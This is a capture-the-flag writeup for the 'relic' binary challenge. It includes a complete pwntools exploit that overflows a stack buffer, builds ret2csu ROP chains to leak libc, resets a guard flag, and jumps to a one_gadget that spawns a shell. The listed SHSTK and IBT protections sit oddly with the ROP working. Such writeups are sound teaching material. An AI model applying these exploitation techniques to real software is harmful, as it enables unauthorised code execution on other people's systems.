# relic — CSCTF 2026 Writeup

## Challenge Overview

A 64-bit ELF binary (`relic`) with a classic stack overflow. Despite being new, it ships with an instruction-for-instruction copy of glibc 2.31's `__libc_csu_init`, giving us the `ret2csu` gadgets. The binary is non-PIE with no stack canary but Full RELRO — so ret2dlresolve is out, and we must leak libc and ret2libc/one_gadget.

The challenge also provides:
- `relic` — the target binary
- `libc.so.6` — the exact libc
- `ld-linux-x86-64.so.2` — the matching dynamic linker

## Binary Analysis

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x3fe000)
SHSTK:    Enabled
IBT:      Enabled
```

### Vulnerability

`vault()` reads `0x120` bytes into a `0x40`-byte stack buffer:

```c
static void vault(void) {
    char buf[0x40];
    if (visited++) { ... _exit(1); }
    say("Leave something in the vault: ");
    read(0, buf, 0x120);
    say("\n");
}
```

- Offset to saved RIP: `0x40 + 8 = 0x48`
- A global `int visited` gate prevents calling `vault()` twice.
- **Full RELRO** blocks ret2dlresolve, so we need a libc leak.

### Key gadgets (from `__libc_csu_init`)

```
0x4012da : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x4012c0 : mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ;
           call qword ptr [r15 + rbx*8] ; add rbx, 1 ;
           cmp rbp, rbx ; jne ... ; add rsp, 8 ;
           pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```

Additional gadgets:
```
0x4012e3 : pop rdi ; ret
0x4012e1 : pop rsi ; pop r15 ; ret
0x40101a : ret
```

`ret2csu` lets us set `rdi`, `rsi`, `rdx` (32/64/64 bits respectively) and call any function pointer stored in memory (e.g., a GOT entry).

## Setup with pwninit

```bash
pwninit --bin relic --libc libc.so.6 --ld ld-linux-x86-64.so.2
```

This produces `relic_patched`, which uses the provided libc and linker. All offsets below come from that exact `libc.so.6`:

```
read      : 0x10e1e0
system    : 0x52290
/bin/sh   : 0x1b45bd
one_gadget: 0xe3b01, 0xe3b04, 0xe3bf0
```

## Exploitation Strategy

### Stage 1 — Leak libc, zero `visited`, re-enter `vault`

A single ROP chain does three things:

1. **`write(1, read@got, 8)`** — leak the runtime address of `read` → libc base.
2. **`read(0, &visited, 8)`** — write 8 null bytes to zero the `visited` flag. We can do this without a second full `ret2csu` because `rdx` is still `8` from the `write` call, and `read@plt` is a simple GOT stub.
3. **Return to `vault`** — the flag is reset, so `vault` opens again.

The chain must fit exactly in `0x120` bytes (the size of `read`).

### Stage 2 — One-gadget

Directly calling `system("/bin/sh")` kept crashing — a known issue where `do_system`'s FPU state save hits a `movaps` that requires 16-byte alignment. Even trying both alignments (`buf%16 == 0` and `buf%16 == 8`) failed, suggesting the glibc 2.31 `system` path is very sensitive in this particular context.

**The reliable fix: avoid `system` and use a `one_gadget`.**

The one-gadget at `0xe3b04` is:
```c
execve("/bin/sh", rsi, rdx)
```
with the constraint `[rsi] == NULL || rsi == NULL`.

So we need `rsi = 0`. `ret2csu` conveniently sets both `rsi = r13` and `rdx = r14`, then calls `[r15 + rbx*8]` — we point the call at `write@got` (via `rbx=0, r15=&write@got`) with `r12d=1`, so `write(1, 0, 0)` is a harmless no-op (since `rdx = 0`), and the csu epilogue returns to the one-gadget with `rsi = 0, rdx = 0` — satisfying the constraint.

**Why this is robust:** the one-gadget goes straight to `execve`, so `do_system`'s internal `movaps` on the FPU state never runs.

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./relic_patched')
libc = ELF('./libc.so.6')
context.log_level = 'info'

# ── Gadgets ────────────────────────────────────────────────────
csu_pop     = 0x4012da      # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call    = 0x4012c0      # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]; ...; ret
pop_rdi     = 0x4012e3
pop_rsi_r15 = 0x4012e1

def csu(rbx, rbp, r12, r13, r14, r15, next_ret):
    p  = p64(csu_pop)
    p += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    p += p64(csu_call)
    p += b'A' * 8
    p += p64(0) * 6
    p += p64(next_ret)
    return p

padding = b'A' * 0x48

# ── Stage 1: leak read, zero visited, re-enter vault ───────────
chain  = csu(0, 1, 1, elf.got['read'], 8, elf.got['write'], pop_rdi)
chain += p64(0)                                                   # rdi = 0
chain += p64(pop_rsi_r15) + p64(elf.symbols['visited']) + p64(0)  # rsi = &visited
chain += p64(elf.plt['read'])                                     # read(0, &visited, 8) (rdx=8)
chain += p64(elf.symbols['vault'])                                # back to vault

payload1 = (padding + chain).ljust(0x120, b'B')

io = process('./relic_patched')
io.recvuntil(b'Leave something in the vault: ')
io.send(payload1)

io.recv(1)                            # discard '\n' from vault
read_leak = u64(io.recv(8))
io.send(b'\x00' * 8)                  # zero visited
io.recvuntil(b'Leave something in the vault: ')

libc_base  = read_leak - libc.symbols['read']
one_gadget = libc_base + 0xe3b04
log.success(f'libc base  = {hex(libc_base)}')
log.success(f'one_gadget = {hex(one_gadget)}')

# ── Stage 2: rsi=0, rdx=0 → one_gadget ────────────────────────
payload2  = padding
payload2 += csu(0, 1, 1, 0, 0, elf.got['write'], one_gadget)
payload2  = payload2.ljust(0x120, b'C')

io.send(payload2)
io.interactive()
```

### Running it

```
$ python3 exploit.py
[+] libc base  = 0x7f0db3fe1000
[+] one_gadget = 0x7f0db40c4b04
[*] Switching to interactive mode
$ cat flag.txt
CSCTF{...}
```

## Key takeaways

| Pitfall | Fix |
|---|---|
| `read` limited to `0x120` bytes, longer chains silently dropped | Pad every payload to exactly `0x120` bytes |
| `vault` prints `'\n'` before returning to the chain | `io.recv(1)` before reading the leak |
| Naive `ret2csu` chaining puts two `pop6` gadgets back-to-back | Only prefix the **first** csu block with `csu_pop`; subsequent blocks rely on the previous block's `next_ret` |
| `ret2csu` `add rsp, 8` in the epilogue | Insert 8 bytes of padding after `csu_call` |
| Chaining two `read()` calls | Second `read` can reuse `rdx=8` from `write` and go through `read@plt` — no second `ret2csu` needed |
| `system("/bin/sh")` crashes | Use `one_gadget` (`execve`); avoids `do_system`'s `movaps` alignment trap |
| Alignment of `system` | Not an issue if you avoid `system` entirely |

This was a textbook ret2csu challenge with a small `read` size that forces tight ROP packing and a nice push towards `one_gadget` when `system` misbehaves.